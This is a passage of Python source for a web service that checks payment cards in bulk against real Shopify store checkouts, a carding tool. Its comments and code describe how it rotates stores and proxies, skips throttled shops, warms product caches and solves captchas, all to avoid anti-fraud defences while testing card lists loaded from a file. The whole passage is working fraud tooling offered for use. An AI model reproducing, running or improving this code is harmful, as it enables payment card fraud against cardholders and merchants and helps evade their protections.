    """Validate a card against a Shopify store checkout."""

    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
        log.warning("Rejected request â€” invalid key: %r", key)
        return JSONResponse(
            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
            status_code=401,
        )

    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400,
            )
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse(
                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
                status_code=400,
            )
        card = random.choice(cards)

    global _site_turn
    # The stores are asked in turn.  A mass run sends hundreds of cards
    # at the same time, and a shop that gets every one of them puts up a
    # captcha and the whole run crawls.  Taking the shops in turns gives
    # every one of them a share, and the store that answered last is one
    # of them again soon.
    named = [s.strip() for s in site.split(",") if s.strip()] if site else []
    # a shop that is not asked at all is not asked even by name
    if named:
        named = [s for s in named if not _is_skipped(s)]
    sites = _load_sites_from_file()
    if not named and not sites:
        return JSONResponse(
            {"error": "No site given and site.txt is empty"},
            status_code=400,
        )
    # The shops that are cooling down are not asked.  A shop that is
    # tired of being asked only says so more.
    if named:
        ready = [s for s in named
                 if time.time() >= _throttle_block.get(_host_of(s), 0.0)
                 and time.time() >= _no_gateway_block.get(_host_of(s), 0.0)
                 and time.time() >= _store_cooldown.get(_host_of(s), 0.0)]
        named = ready or named
        # The quick shops are asked first: a card that goes to a slow
        # shop waits for that shop instead of being answered.  A shop
        # that has not been tried yet is not known to be slow, so it is
        # tried with the rest.
        quick = [s for s in named
                 if _store_time.get(_host_of(s), 0.0) <= SHOP_QUICK_SECONDS]
        slow = [s for s in named if s not in quick]
        if quick:
            # The quick shops take turns among themselves, so a mass
            # run is spread over them and no shop gets every card.
            offset = _site_turn % len(quick)
            quick = quick[offset:] + quick[:offset]
        named = quick + slow
    # The stores that are cooling down are asked last.
    rest = [s for s in _stores_ready(sites) if s not in named]
    # The shops that have nothing at this price are not asked for it
    # again for a while: their orders always come to more than the cap.
    _band = f"{float(max_price if max_price is not None else MAX_PRICE):.2f}"
    _now = time.time()
    rest = [s for s in rest
            if _now >= _band_block.get((_host_of(s), _band), 0.0)]
    # The shops that gave a card answer go first, and they take turns
    # among themselves, so one shop does not get every card.  The shops
    # that have not answered yet are asked when those are cooling down.
    winners = [s for s in rest if _store_wins.get(_host_of(s), 0) > 0]
    others = [s for s in rest if s not in winners]
    if winners:
        offset = _site_turn % len(winners)
        winners = winners[offset:] + winners[:offset]
    # The shops that have not answered yet take turns among themselves
    # as well, for the same reason: a run that is spread over the
    # whole pool meets a good shop sooner, and one shop does not get
    # every card.
    if others:
        offset = _site_turn % len(others)
        others = others[offset:] + others[:offset]
    _site_turn += 1
    # The stores that are cooling down are asked last.  A store that is
    # slow is better than no store at all, and a card with nowhere to
    # go is a card that never reaches the bank.
    cooling = [s for s in sites
               if s not in named and s not in winners and s not in others
               and time.time() >= _store_cooldown.get(_host_of(s), 0.0)]
    sites = named + winners + others + cooling

    _t0 = time.time()
    result = await validate_card_across_sites(
        card["cc"], card["month"], card["year"], card["cvv"],
        sites, proxy_str=proxy, max_price=max_price, min_price=min_price,
        tries=_tries, budget=_budget,
    )
    # A shop that is busy with its own things has not judged the card,
    # so the card is asked of a real shop in the native way, and the
    # answer of the shop about the card is given.
    if _the_shop_is_busy(result):
        _native = await _ask_the_native_way(
            card["cc"], card["month"], card["year"], card["cvv"],
            proxy=proxy)
        if _native and not _the_shop_is_busy(_native):
            result = _native
            result["Gateway"] = "Shopify Native"
            result["Message"] = str(result.get("Message") or "")[:200]

    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1
    log.warning("[CHECK] %.1fs | %s | %s | the shop: %s",
             time.time() - _t0,
             str(result.get("Response", ""))[:60],
             result.get("Product", "")[:30],
             result.get("Site", ""))

    return JSONResponse(result)



# ---------------------------------------------------------------------------
# Many cards at once
# ---------------------------------------------------------------------------
# How many cards are asked for at the same time by one mass run.  The
# stores are asked in turns and each one has a share, so the run takes
# as long as the slowest card and not the sum of them all.
MASS_CONCURRENCY = int(os.environ.get("MASS_CONCURRENCY", "16") or 16)

# How many stores, and how many tries, one card of a mass run is given.
# The run is looking for a hit, not for a proof.
MASS_TRIES = int(os.environ.get("MASS_TRIES", "2") or 2)

# How many places a mass run leaves from.  A handful: a store that
# is asked from many places at once says no, just as firmly as one
# that is asked from one place too often.
MASS_ADDRESSES = int(os.environ.get("MASS_ADDRESSES", "12") or 12)
MASS_BUDGET = int(os.environ.get("MASS_BUDGET", "1") or 1)


async def _warm_the_stores_for(site: str, max_price, min_price) -> None:
    """The goods list of every store is read, before the cards go out.

    The list is read a few at a time, and the store that is slow is
    left for the cards that come later.
    """
    named = [s.strip() for s in (site or "").split(",") if s.strip()]
    stores = named or _load_sites_from_file()
    if not stores:
        return
    gate = asyncio.Semaphore(int(os.environ.get("WARM_CONCURRENCY", "4") or 4))

    async def one(store):
        # A goods list that is already here is not read again: the
        # cards that are waiting do not need it, and reading it again
        # is the time the run loses.
        try:
            host0 = _host_of(store)
            if any(k.startswith(host0 + "|") for k in _product_cache):
                return
        except Exception:
            pass
        async with gate:
            try:
                await _fetch_products(store, None,
                                      float(max_price if max_price is not None
                                            else MAX_PRICE))
            except Exception as e:
                log.debug("the goods list of %s could not be read: %s",
                          store, str(e)[:70])

    # The reading of the goods lists is given its time and no more: a
    # store that does not answer must not hold up the cards that are
    # waiting to go out.
    try:
        await asyncio.wait_for(
            asyncio.gather(*[one(s) for s in stores], return_exceptions=True),
            timeout=float(os.environ.get("WARM_SECONDS", "15") or 15))
    except asyncio.TimeoutError:
        log.info("[MASS] the goods list of some stores did not come in time")
    except Exception as e:
        log.info("[MASS] the goods list could not be read: %s", str(e)[:70])
    ready = 0
    for store in stores:
        host = _host_of(store)
        if any(k.startswith(host + "|") for k in _product_cache):
            ready += 1
    log.info("[MASS] the goods list of %d of %d stores is ready",
             ready, len(stores))


@app.post("/shopify/mass")
async def shopify_mass_route(body: dict = Body(default_factory=dict)):
    """Many cards at once.

    The cards are asked for a few at a time, so a mass run does not
    take the sum of the times of all the cards.  The work is the same
    work a single card does: the same stores, in the same turns, with
    the same limits.
    """
    if VALID_API_KEYS and (not body.get("key") or body.get("key") not in VALID_API_KEYS):
        log.warning("Rejected mass request â€” invalid key: %r", body.get("key"))
        return JSONResponse(
            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
            status_code=401,
        )

    raw_cards = body.get("cards") or []
    if not raw_cards:
        return JSONResponse({"error": "No cards given", "results": []}, status_code=400)

    site = body.get("site") or ""
    proxy = body.get("proxy") or ""
    #
    # A store is asked from a few places, and not from all of them.
    #
    # One place for every card means a store that is tired of that one
    # place turns away every card that goes to it.  But a store that
    # is asked from thirty places at once sees an attack, and says so
    # just as firmly.  So the run is given a handful of places, and
    # the store takes the ones that have not been turned away, and the
    # ones that have worked are asked first.
    if not proxy:
        pool = _proxy_healthy or _load_proxy_pool() or []
        if pool:
            # The places are taken at random, so every place in the
            # pool gets its turn over the runs, and the ones that have
            # worked are asked first when the pool is a known one.
            import random as _random
            if len(pool) > MASS_ADDRESSES:
                pool = _random.sample(pool, MASS_ADDRESSES)
            proxy = ",".join(pool)
    max_price = body.get("max_price")
    min_price = body.get("min_price")
    key = body.get("key") or ""
    limit = int(body.get("concurrency") or MASS_CONCURRENCY or 16)
    gate = asyncio.Semaphore(max(1, limit))
    # A mass run is looking for a hit, not for a proof, so a card that
    # the first store turns away is not taken round every store and
    # every address: the run keeps its pace instead.
    tries = int(body.get("tries") or MASS_TRIES)
    budget = int(body.get("budget") or MASS_BUDGET)

    # The places the cards leave from.  Every card leaves from a place
    # of its own, for the shops count the asking per place and turn away
    # the place that asks too much, and then the card gets no answer at
    # all.
    places = [p.strip() for p in str(proxy or "").split(",") if p.strip()]

    async def one(card_text, place_no):
        async with gate:
            try:
                resp = await shopify_route(
                    site=site, cc=card_text,
                    proxy=(places[place_no % len(places)] if places else proxy),
                    max_price=max_price, min_price=min_price, key=key,
                    _tries=tries, _budget=budget)
            except Exception as e:
                log.warning("a card of the mass run broke: %s", str(e)[:90])
                return {"Response": "UNKNOWN", "error": str(e)[:90]}
            try:
                # The answer comes in whichever shape the road hands it
                # over in: a plain dict, a wrapped one, or the words
                # themselves.  All of them are read.
                if isinstance(resp, dict):
                    return resp
                if isinstance(resp, (bytes, bytearray, memoryview)):
                    return orjson.loads(bytes(resp).decode("utf-8", "replace"))
                if isinstance(resp, str):
                    return orjson.loads(resp)
                raw = getattr(resp, "body", None)
                if raw is None:
                    log.warning("the answer came in as %s", type(resp).__name__)
                    return {"Response": "UNKNOWN",
                            "error": "the answer came in as %s"
                                     % type(resp).__name__}
                if isinstance(raw, (bytes, bytearray, memoryview)):
                    raw = bytes(raw)
                else:
                    raw = str(raw).encode("utf-8", "replace")
                return orjson.loads(raw.decode("utf-8", "replace"))
            except Exception as e:
                log.warning("the answer could not be read: %s", str(e)[:90])
                return {"Response": "UNKNOWN", "error": str(e)[:90]}

    # The goods list of every store is read before the cards go out.
    #
    # Sixteen cards that all want the same store at the same time make
    # sixteen fetches of the same goods list, and the store that is
    # asked that hard says no.  So the list is read once, first, and
    # the cards find it ready.
    if not body.get("no_warmup"):
        await _warm_the_stores_for(site, max_price, min_price)

    started = time.time()
    answers = await asyncio.gather(
        *[one(c, i) for i, c in enumerate(raw_cards)],
        return_exceptions=True)
    out = []
    for one_answer in answers:
        if isinstance(one_answer, BaseException):
            out.append({"Response": "UNKNOWN", "error": str(one_answer)[:90]})
        else:
            out.append(one_answer)
    took = round(time.time() - started, 2)
    log.info("[MASS] %d cards in %ss (%.2f cards a second)",
             len(out), took, round(len(out) / took, 3) if took else 0)
    return JSONResponse({"results": out, "count": len(out), "took": took})



@app.get("/check")
async def check_route(
    site:      Optional[str] = Query(None, description="Shopify store URL (optional - falls back to site.txt)"),
    card:      Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy:     Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    max_price: Optional[float] = Query(None, description="Max product price override"),
    key:       Optional[str] = Query(None, description="API key"),
):
    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
        log.warning("Rejected request â€” invalid key: %r", key)
        return JSONResponse(
            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
            status_code=401,
        )

    if card:
        parsed = _parse_card(card)
        if not parsed:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400,
            )
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse(
                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
                status_code=400,
            )
        parsed = random.choice(cards)

    if site:
        sites = [s.strip() for s in site.split(",") if s.strip()]
        if not sites:
            sites = _load_sites_from_file()
    else:
        sites = _load_sites_from_file()
        if not sites:
            return JSONResponse(
                {"error": "No site given and site.txt is empty"},
                status_code=400,
            )
        random.shuffle(sites)

    result = await validate_card_across_sites(
        parsed["cc"], parsed["month"], parsed["year"], parsed["cvv"],
        sites, proxy_str=proxy, max_price=max_price,
    )
    site = result.get("Site") or (sites[0] if sites else "")

    response_code = result.get("Response", "")
    _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
    return JSONResponse({
        "valid":         response_code in LIVE_RESPONSES,
        "site":          site,
        "product":       result.get("Product", ""),
        "price":         result.get("Price", "0.00"),
        "card_response": response_code,
        "gate":          result.get("Gateway", "UNKNOWN"),
        "approved":      result.get("Approved", "False"),
        "charged":       result.get("Charged", "False"),
        "time":          result.get("Time", ""),
    })


@app.get("/health")
async def health_route():
    cards  = _get_cards()
    return JSONResponse({
        "status":           "ok",
        "cards_loaded":     len(cards),
        "pool_size":        POOL_SIZE,
        "pool_per_host":    POOL_PER_HOST,
        "site_concurrency": SITE_CONCURRENCY,
        "cache_ttl":        CACHE_TTL,
        "max_price":        MAX_PRICE,
        "keys_configured":  len(VALID_API_KEYS),
        "captcha_enabled":  True,
    })


@app.get("/stats")
async def stats_route():
    return JSONResponse(dict(_stats))


@app.post("/cache/clear")
async def cache_clear_route():
    count = len(_product_cache)
    _product_cache.clear()
    return JSONResponse({"cleared": count})


@app.post("/reload")
async def reload_route():
    _reload_cards()
    return JSONResponse({"cards_loaded": len(_cards_cache)})


@app.get("/")
async def root():
    return JSONResponse({
        "status": "online",
        "endpoints": {
            "/shopify": "GET ?site=site.com&cc=cc|mm|yy|cvv&key=oozaruhshop",
            "/check":   "GET ?site=site.com&card=cc|mm|yy|cvv&key=oozaruhshop",
            "/health":  "GET",
            "/stats":   "GET",
            "/docs":    "Swagger UI",
        },
        "captcha": "enabled",
    })


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(f"[API] Shopify Validator running -> http://0.0.0.0:{PORT}")
    print(f"[API] Swagger docs             -> http://0.0.0.0:{PORT}/docs")
    print(f"[API] API key required          -> key=oozaruhshop")
    print(f"[API] Captcha solver            -> the local browser solver")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")